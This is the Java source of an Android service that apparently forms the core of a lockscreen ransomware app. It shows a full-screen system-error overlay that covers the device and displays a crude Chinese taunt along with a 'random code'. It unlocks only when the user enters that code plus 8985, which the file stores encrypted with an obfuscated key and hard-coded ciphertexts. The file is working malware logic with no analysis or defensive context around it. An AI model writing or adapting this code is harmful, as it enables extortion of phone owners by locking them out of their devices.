package com.h;

import android.app.Application;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import static android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;

public class MyService extends Service {
    Button bt;
    CryptoUtil des;
    EditText ed;
    Editor editor;
    long pass;
    Long passw;
    String password;
    String ppss;
    SharedPreferences share;
    TextView tv;

    private View mFloatLayout;
    private WindowManager mWindowManager;
    private LayoutParams wmParams;

    private void displayView() {
        wmParams = new LayoutParams();
        Application application = getApplication();
        mWindowManager = (WindowManager) application.getSystemService(Context.WINDOW_SERVICE);
        wmParams.type = TYPE_SYSTEM_ERROR;
        wmParams.format = 1;
        wmParams.flags = 1280;
        wmParams.gravity = 49;
        wmParams.x = 0;
        wmParams.y = 0;
        wmParams.width = -1;
        wmParams.height = -1;
        mFloatLayout = LayoutInflater.from(getApplication()).inflate(R.layout.newone, (ViewGroup) null);
        mWindowManager.addView(mFloatLayout, wmParams);

        bt = mFloatLayout.findViewById(R.id.bt);
        ed = mFloatLayout.findViewById(R.id.ed);
        tv = mFloatLayout.findViewById(R.id.tv);

        try {
            ed.setHint("用jj戳一下也能解锁哦");
            tv.append("随机码:");
        } catch (Exception e) {
        }

        bt.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View view) {
                try {
                    if (ed.getText().toString().equals(des.decrypt(share.getString("passw", "")))) {
                        mWindowManager.removeView(mFloatLayout);
                        stopSelf();
                    }
                } catch (Exception e) {
                }
            }
        });

        try {
            tv.append("\n" + des.decrypt("e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c") + share.getLong("m", 0));
        } catch (Exception e2) {
        }
    }

    public boolean isNetworkAvailable(Context context) {
        if (context != null) {
            NetworkInfo activeNetworkInfo = ((ConnectivityManager) context.getSystemService(CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
            if (activeNetworkInfo != null) {
                return activeNetworkInfo.isAvailable();
            }
        }
        return false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        pass = (long) (Math.random() * ((double) 100000000));
        passw = pass + ((long) 8985);
        des = new CryptoUtil("flower");

        try {
            des = new CryptoUtil(des.decrypt("c29fe56fa59ab0db"));
        } catch (Exception e) {
        }

        share = getSharedPreferences("Flowers", 0);
        editor = share.edit();

        if (share.getLong("m", 0) == 0) {
            editor.putLong("m", pass);
            editor.commit();
            try {
                editor.putString("passw", des.encrypt(new StringBuffer().append("").append(passw).toString()));
                editor.commit();
            } catch (Exception e2) {
            }

            if (isNetworkAvailable(getApplicationContext())) {
                ppss = String.valueOf(share.getLong("m", (long) 8)) + "";
                try {
                    password = des.decrypt(share.getString("passw", ""));
                } catch (Exception e3) {
                }

                new Thread() {
                    public void run() {
                    }
                }.start();

                return;
            }

            try {
                editor.putLong("m", Long.parseLong(des.decrypt("5a15e58cc8db8d1c700ecb6bb7b627a9")));
                editor.commit();
                editor.putString("passw", "5a15e58cc8db8d1c700ecb6bb7b627a9");
                editor.commit();
            } catch (Exception e4) {
            }
        }
    }

    @Override
    public void onStart(Intent intent, int i) {
        super.onStart(intent, i);
        displayView();
    }
}
